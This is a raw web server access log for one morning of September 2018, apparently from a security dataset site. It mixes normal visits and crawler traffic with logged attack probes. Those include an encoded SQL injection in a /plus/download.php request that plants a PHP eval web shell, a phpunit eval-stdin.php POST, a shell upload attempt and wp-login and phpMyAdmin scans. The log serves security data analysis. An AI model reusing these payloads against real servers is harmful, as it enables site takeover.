113.171.224.176 - - [27/Sep/2018:05:08:19 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 46720 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
157.55.39.84 - - [27/Sep/2018:05:09:07 -0700] "GET /self.logs/access.log.2017-10-20.gz HTTP/1.1" 301 545 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
109.201.133.238 - - [27/Sep/2018:05:12:50 -0700] "GET / HTTP/1.1" 200 12327 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
109.201.133.238 - - [27/Sep/2018:05:12:51 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27732 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
109.201.133.238 - - [27/Sep/2018:05:12:51 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7372 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
109.201.133.238 - - [27/Sep/2018:05:12:51 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 534 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
193.60.168.222 - - [27/Sep/2018:05:13:04 -0700] "GET / HTTP/1.1" 200 46212 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
193.60.168.222 - - [27/Sep/2018:05:13:04 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
193.60.168.222 - - [27/Sep/2018:05:13:04 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
193.60.168.222 - - [27/Sep/2018:05:13:05 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
46.118.157.206 - - [27/Sep/2018:05:14:41 -0700] "GET / HTTP/1.1" 200 46156 "https://xn--80aaafbn2bc2ahdfrfkln6l.xn--p1ai/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; XMPP Tiscali Communicator v.10.0.2; .NET CLR 2.0.50727)" 
46.118.157.206 - - [27/Sep/2018:05:14:43 -0700] "GET / HTTP/1.1" 200 46156 "https://xn--80aaafbn2bc2ahdfrfkln6l.xn--p1ai/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; XMPP Tiscali Communicator v.10.0.2; .NET CLR 2.0.50727)" 
18.224.45.232 - - [27/Sep/2018:05:23:34 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (X11; Linux x86_64) Trident/5.0 Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41" 
47.88.217.155 - - [27/Sep/2018:05:23:47 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
47.88.217.155 - - [27/Sep/2018:05:23:48 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
47.88.217.155 - - [27/Sep/2018:05:23:49 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
47.88.217.155 - - [27/Sep/2018:05:23:50 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
209.15.209.85 - - [27/Sep/2018:05:27:21 -0700] "HEAD / HTTP/1.1" 200 239 "-" "-" 
222.166.230.127 - - [27/Sep/2018:05:27:23 -0700] "GET / HTTP/1.1" 200 12383 "https://www.researchgate.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
222.166.230.127 - - [27/Sep/2018:05:27:23 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
222.166.230.127 - - [27/Sep/2018:05:27:23 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
222.166.230.127 - - [27/Sep/2018:05:27:24 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
58.216.8.130 - - [27/Sep/2018:05:38:23 -0700] "HEAD //xmlrpc.php HTTP/1.1" 418 0 "-" "-" 
222.166.230.127 - - [27/Sep/2018:05:29:32 -0700] "GET /tg/a.zip HTTP/1.1" 200 66189337 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
52.175.245.102 - - [27/Sep/2018:05:42:51 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)" 
162.210.196.97 - - [27/Sep/2018:05:47:51 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.97 - - [27/Sep/2018:05:47:52 -0700] "GET / HTTP/1.1" 200 46156 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
114.115.143.161 - - [27/Sep/2018:05:49:04 -0700] "GET //plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=114&arrs2[]=101&arrs2[]=97&arrs2[]=100&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=120&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=109&arrs2[]=79&arrs2[]=111&arrs2[]=110&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 HTTP/1.1" 418 584 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
114.115.143.161 - - [27/Sep/2018:05:49:04 -0700] "GET //plus/ad_js.php?aid=19 HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
114.115.143.161 - - [27/Sep/2018:05:49:05 -0700] "GET //plus/read.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
114.115.143.161 - - [27/Sep/2018:05:49:05 -0700] "POST //include/dialog/select_soft_post.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
114.115.143.161 - - [27/Sep/2018:05:49:06 -0700] "GET //data/cache/asd.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
114.115.143.161 - - [27/Sep/2018:05:49:06 -0700] "GET //install/index.php.bak?step=11&insLockfile=a&s_lang=x&install_demo_name=../data/admin/config_update.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
114.115.143.161 - - [27/Sep/2018:05:49:07 -0700] "POST //vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
114.115.143.161 - - [27/Sep/2018:05:49:07 -0700] "GET //vendor/phpunit/phpunit/src/Util/PHP/asd.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
114.115.143.161 - - [27/Sep/2018:05:49:08 -0700] "POST //index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
114.115.143.161 - - [27/Sep/2018:05:49:08 -0700] "POST //search.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
114.115.143.161 - - [27/Sep/2018:05:49:09 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
114.115.143.161 - - [27/Sep/2018:05:49:09 -0700] "POST //index.php?s=/Core/File/uploadPictureBase64.html HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
114.115.143.161 - - [27/Sep/2018:05:49:10 -0700] "GET //install.php?finish=1 HTTP/1.1" 404 340 "http://www.secrepo.com//install.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
114.115.143.161 - - [27/Sep/2018:05:49:10 -0700] "POST //da.php HTTP/1.1" 404 340 "http://www.secrepo.com//install.php" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
114.115.143.161 - - [27/Sep/2018:05:49:11 -0700] "POST //dayrui/libraries/Chart/ofc_upload_image.php?name=shell7645.php HTTP/1.1" 418 584 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
114.115.143.161 - - [27/Sep/2018:05:49:11 -0700] "GET //dayrui/libraries/tmp-upload-images/shell7645.php HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50" 
114.115.143.161 - - [27/Sep/2018:05:49:12 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" 
114.115.143.161 - - [27/Sep/2018:05:49:12 -0700] "GET //login.action HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" 
114.115.143.161 - - [27/Sep/2018:05:49:13 -0700] "GET //index.action HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" 
114.115.143.161 - - [27/Sep/2018:05:49:13 -0700] "GET //search.action HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" 
114.115.143.161 - - [27/Sep/2018:05:49:14 -0700] "GET //pages/viewpage.action HTTP/1.1" 404 340 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" 
72.83.47.233 - - [27/Sep/2018:05:51:47 -0700] "GET / HTTP/1.1" 200 12383 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0" 
72.83.47.233 - - [27/Sep/2018:05:51:48 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0" 
72.83.47.233 - - [27/Sep/2018:05:51:48 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0" 
72.83.47.233 - - [27/Sep/2018:05:51:48 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0" 
72.83.47.233 - - [27/Sep/2018:05:52:47 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 33631944 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0" 
72.83.47.233 - - [27/Sep/2018:05:53:37 -0700] "GET /Datasets%20Description/Network/http.html HTTP/1.1" 200 1603 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0" 
72.83.47.233 - - [27/Sep/2018:05:53:37 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0" 
222.166.230.127 - - [27/Sep/2018:05:53:39 -0700] "GET /auth.log/auth.log.gz HTTP/1.1" 200 554524 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
78.156.232.141 - - [27/Sep/2018:05:54:20 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
78.156.232.141 - - [27/Sep/2018:05:54:20 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
72.83.47.233 - - [27/Sep/2018:05:54:22 -0700] "GET /Datasets%20Description/Network/dns.html HTTP/1.1" 200 1437 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0" 
72.83.47.233 - - [27/Sep/2018:05:53:13 -0700] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 14594160 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0" 
72.83.47.233 - - [27/Sep/2018:05:55:12 -0700] "GET /Datasets%20Description/Network/tunnel.html HTTP/1.1" 200 1364 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0" 
72.83.47.233 - - [27/Sep/2018:05:55:45 -0700] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 551041635 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0" 
123.125.67.159 - - [27/Sep/2018:06:06:41 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
123.125.67.222 - - [27/Sep/2018:06:06:42 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
220.181.108.116 - - [27/Sep/2018:06:06:45 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
113.171.224.176 - - [27/Sep/2018:06:09:33 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 46720 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
188.21.2.78 - - [27/Sep/2018:06:12:14 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko" 
188.21.2.78 - - [27/Sep/2018:06:12:14 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko" 
188.21.2.78 - - [27/Sep/2018:06:12:14 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko" 
188.21.2.78 - - [27/Sep/2018:06:12:14 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko" 
49.150.224.68 - - [27/Sep/2018:06:16:55 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
218.89.219.165 - - [27/Sep/2018:06:19:33 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
88.230.38.170 - - [27/Sep/2018:06:19:58 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
88.230.38.170 - - [27/Sep/2018:06:19:59 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
125.16.236.132 - - [27/Sep/2018:06:20:57 -0700] "GET / HTTP/1.1" 304 189 "-" "Mozilla/4.0 (compatible;)" 
18.221.45.138 - - [27/Sep/2018:06:24:34 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Trident/5.0 Safari/602.1" 
2.51.43.21 - - [27/Sep/2018:06:26:01 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
2.51.43.21 - - [27/Sep/2018:06:26:01 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
115.97.153.148 - - [27/Sep/2018:06:30:47 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0" 
115.97.153.148 - - [27/Sep/2018:06:30:47 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0" 
115.97.153.148 - - [27/Sep/2018:06:30:48 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0" 
132.232.42.185 - - [27/Sep/2018:06:31:38 -0700] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 239 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" 
132.232.42.185 - - [27/Sep/2018:06:31:42 -0700] "GET /scripts/setup.php HTTP/1.1" 404 239 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" 
181.196.72.15 - - [27/Sep/2018:06:31:44 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
132.232.42.185 - - [27/Sep/2018:06:31:46 -0700] "GET /pma/scripts/setup.php HTTP/1.1" 404 239 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" 
123.125.71.55 - - [27/Sep/2018:06:31:48 -0700] "GET / HTTP/1.1" 200 12346 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
123.125.67.164 - - [27/Sep/2018:06:31:48 -0700] "GET / HTTP/1.1" 200 12346 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36" 
132.232.42.185 - - [27/Sep/2018:06:31:48 -0700] "GET /xmlrpc.php HTTP/1.1" 404 239 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" 
181.196.72.15 - - [27/Sep/2018:06:32:00 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
181.196.72.15 - - [27/Sep/2018:06:32:05 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
181.196.72.15 - - [27/Sep/2018:06:32:12 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
181.196.72.15 - - [27/Sep/2018:06:32:31 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
185.6.245.156 - - [27/Sep/2018:06:36:46 -0700] "GET /squid/access.log.gz HTTP/1.1" 200 23177322 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15" 
110.168.219.206 - - [27/Sep/2018:06:39:42 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
110.168.219.206 - - [27/Sep/2018:06:39:42 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
157.55.39.84 - - [27/Sep/2018:06:40:22 -0700] "GET /self.logs/access.log.2017-10-20.gz HTTP/1.1" 200 22938 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.110 - - [27/Sep/2018:06:41:43 -0700] "GET /self.logs/error.log.2017-08-23.gz HTTP/1.1" 304 188 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
140.113.208.16 - - [27/Sep/2018:06:45:23 -0700] "GET / HTTP/1.1" 200 12383 "https://www.researchgate.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
140.113.208.16 - - [27/Sep/2018:06:45:47 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
140.113.208.16 - - [27/Sep/2018:06:45:51 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
140.113.208.16 - - [27/Sep/2018:06:46:05 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
210.47.7.5 - - [27/Sep/2018:06:46:38 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0" 
131.247.168.248 - - [27/Sep/2018:06:46:45 -0700] "GET / HTTP/1.1" 200 12383 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
131.247.168.248 - - [27/Sep/2018:06:46:45 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
